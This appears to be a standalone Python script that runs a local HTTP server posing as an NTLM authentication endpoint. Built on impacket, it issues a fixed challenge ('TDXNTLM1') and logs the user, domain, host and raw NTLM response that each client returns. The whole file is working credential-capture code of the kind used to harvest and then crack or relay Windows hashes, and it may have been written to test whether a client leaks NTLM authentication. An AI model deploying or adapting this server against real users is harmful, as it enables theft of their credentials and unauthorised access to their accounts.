import base64,http.server,json
from impacket import ntlm
def log(o): print(json.dumps(o),flush=True)
class H(http.server.BaseHTTPRequestHandler):
 protocol_version="HTTP/1.1"
 def log_message(self,*a): pass
 def send0(self,status=401,auth=None):
  self.send_response(status)
  if auth:self.send_header("WWW-Authenticate",auth)
  self.send_header("Content-Length","0");self.send_header("Connection","close");self.end_headers()
 def do_GET(self):
  a=self.headers.get("Authorization","");log({"path":self.path,"auth_prefix":a[:20],"auth_len":len(a),"ua":self.headers.get("User-Agent")})
  if not a.startswith("NTLM "):return self.send0(401,"NTLM")
  raw=base64.b64decode(a[5:]);typ=int.from_bytes(raw[8:12],"little");log({"type":typ,"raw":a[5:]})
  if typ==1:
   n=ntlm.NTLMAuthNegotiate();n.fromString(raw);flags=ntlm.NTLMSSP_NEGOTIATE_VERSION|ntlm.NTLMSSP_NEGOTIATE_TARGET_INFO|ntlm.NTLMSSP_TARGET_TYPE_SERVER|ntlm.NTLMSSP_NEGOTIATE_NTLM
   for f in [ntlm.NTLMSSP_NEGOTIATE_56,ntlm.NTLMSSP_NEGOTIATE_128,ntlm.NTLMSSP_NEGOTIATE_KEY_EXCH,ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY,ntlm.NTLMSSP_NEGOTIATE_UNICODE,ntlm.NTLM_NEGOTIATE_OEM,ntlm.NTLMSSP_NEGOTIATE_ALWAYS_SIGN,ntlm.NTLMSSP_NEGOTIATE_SIGN]:
    if n["flags"]&f:flags|=f
   c=ntlm.NTLMAuthChallenge();c["flags"]=flags;c["domain_name"]=b"";c["challenge"]=b"TDXNTLM1";c["TargetInfoFields"]=ntlm.AV_PAIRS();c["TargetInfoFields_len"]=0;c["TargetInfoFields_max_len"]=0;c["TargetInfoFields_offset"]=56;c["Version"]=b"\xff"*8;c["VersionLen"]=8
   return self.send0(401,"NTLM "+base64.b64encode(c.getData()).decode())
  if typ==3:
   x=ntlm.NTLMAuthChallengeResponse();x.fromString(raw);log({"TYPE3":True,"user":x["user_name"].decode("utf-16le",errors="replace"),"domain":x["domain_name"].decode("utf-16le",errors="replace"),"host":x["host_name"].decode("utf-16le",errors="replace"),"nt_len":len(x["ntlm"]) });return self.send0(200)
  return self.send0(401,"NTLM")
http.server.ThreadingHTTPServer(("127.0.0.1",18087),H).serve_forever()
